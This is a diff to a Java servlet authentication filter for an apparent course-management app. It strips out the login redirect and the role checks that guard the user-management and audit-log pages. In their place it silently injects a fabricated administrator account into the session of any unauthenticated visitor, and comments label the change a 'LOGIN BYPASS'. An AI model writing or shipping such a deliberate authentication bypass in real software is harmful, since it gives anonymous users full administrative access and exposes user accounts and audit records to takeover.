@@ -23,42 +23,26 @@ public class AuthFilter implements Filter {
         
         HttpServletRequest req = (HttpServletRequest) request;
         HttpServletResponse res = (HttpServletResponse) response;
-        HttpSession session = req.getSession(false);
         
-        User currentUser = (session != null) ? (User) session.getAttribute("currentUser") : null;
-        String requestURI = req.getRequestURI();
+        // Force create a session if one doesn't exist
+        HttpSession session = req.getSession(true); 
+        User currentUser = (User) session.getAttribute("currentUser");
 
-        if (AUTH_DISABLED) {
-            chain.doFilter(request, response);
-            return;
-        }
-
-        boolean publicPage = requestURI.endsWith("/login.xhtml")
-                || requestURI.endsWith("/forgot-password.xhtml");
-
-        if (publicPage) {
-            chain.doFilter(request, response);
-            return;
-        }
-
+        // ==========================================
+        // LOGIN BYPASS: Automatically inject an Admin
+        // ==========================================
         if (currentUser == null) {
-            // Not logged in, redirect to login page
-            res.sendRedirect(req.getContextPath() + "/pages/login.xhtml");
-            return;
+            currentUser = new User();
+            currentUser.setId(1L);
+            currentUser.setUsername("admin");
+            currentUser.setFullName("Auto Admin Bypass");
+            currentUser.setRole(UserRole.COURSE_ADMINISTRATOR);
+            
+            session.setAttribute("currentUser", currentUser);
         }
+        // ==========================================
 
-        // Role-Based Access Control enforcement
-        if (requestURI.contains("/users.xhtml") && currentUser.getRole() != UserRole.COURSE_ADMINISTRATOR) {
-            // Academic Officers should not manage users
-            res.sendRedirect(req.getContextPath() + "/pages/dashboard.xhtml");
-            return;
-        }
-
-        if (requestURI.contains("/audit-log.xhtml") && currentUser.getRole() != UserRole.COURSE_ADMINISTRATOR) {
-            res.sendRedirect(req.getContextPath() + "/pages/dashboard.xhtml");
-            return;
-        }
-
+        // Let every request go through without checking anything
         chain.doFilter(request, response);
     }
 }
